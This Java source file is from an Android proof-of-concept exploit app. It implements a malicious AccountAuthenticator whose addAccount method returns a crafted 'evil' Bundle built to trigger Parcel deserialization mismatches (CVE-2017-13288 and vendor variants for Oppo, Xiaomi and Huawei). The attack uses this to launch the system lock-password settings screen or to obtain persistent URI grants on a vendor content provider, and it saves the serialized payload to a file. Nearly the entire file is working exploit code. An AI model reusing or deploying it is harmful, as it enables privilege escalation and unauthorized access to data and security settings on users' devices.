package com.example.launchanywherebyevilparcel1999;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class MyAuthenticator extends AbstractAccountAuthenticator {
    public static final String TAG="MyAuthenticator";

    private Context mContext;

    public MyAuthenticator(Context context) {
        super(context);
        mContext=context;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse accountAuthenticatorResponse, String s) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse accountAuthenticatorResponse, String s, String s1, String[] strings, Bundle bundle) throws NetworkErrorException {
        Log.v(TAG,"addAccount");

        Bundle evil = new Bundle();


        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_RUN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.password.ChooseLockPassword"));
        intent.putExtra(Intent.EXTRA_USER, -2);


        Intent evilintent = new Intent("EVIL");
        evilintent.setComponent(new ComponentName("com.example.launchanywherebyevilparcel1999","com.example.launchanywherebyevilparcel1999.EvilActivity"));
        //intent.setClassName(mContext.getPackageName(), getClass().getCanonicalName());
        evilintent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION);
        evilintent.setData(Uri.parse("content://com.coloros.phonemanager.files/clear_share"));
        Log.d("EVIL:",evilintent.toString());




        //evil = new EvilBundle(mContext).makeBundle(intent,"CVE-2017-13288");

        //confirmed
        evil = new EvilBundle(mContext).makeBundleForWorkSource(evilintent);

        //oppo
        //comfirmed
        //evil = new EvilBundle(mContext).makeBundleForOppoSinceOToQ(intent,"com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse");
        //not comfirmed
        //evil = new EvilBundle(mContext).makeBundleForOppoSinceOToQ(intent,"com.android.internal.telephony.OperatorInfo");

        //xiaomi
        //not comfirmed
        //evil = new EvilBundle(mContext).makeBundleForMiR(intent);
        //evil = new EvilBundle(mContext).makeBundleForMiMTK(intent);

        //huawei
        //evil = new EvilBundle(mContext).makeBundleForHuaweiForN(intent);
        //evil = new EvilBundle(mContext).makeBundleForMiMTK(intent);
        try {
            Parcel Data = Parcel.obtain();
            evil.writeToParcel(Data,0);
            byte[] raw = Data.marshall();//序列化
            FileOutputStream fos = null;
            fos  = mContext.openFileOutput("worksource.pcl", Context.MODE_PRIVATE);
            fos.write(raw);
            fos.close();
        } catch (FileNotFoundException e){
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return evil;

    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String s) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String[] strings) throws NetworkErrorException {
        return null;
    }
}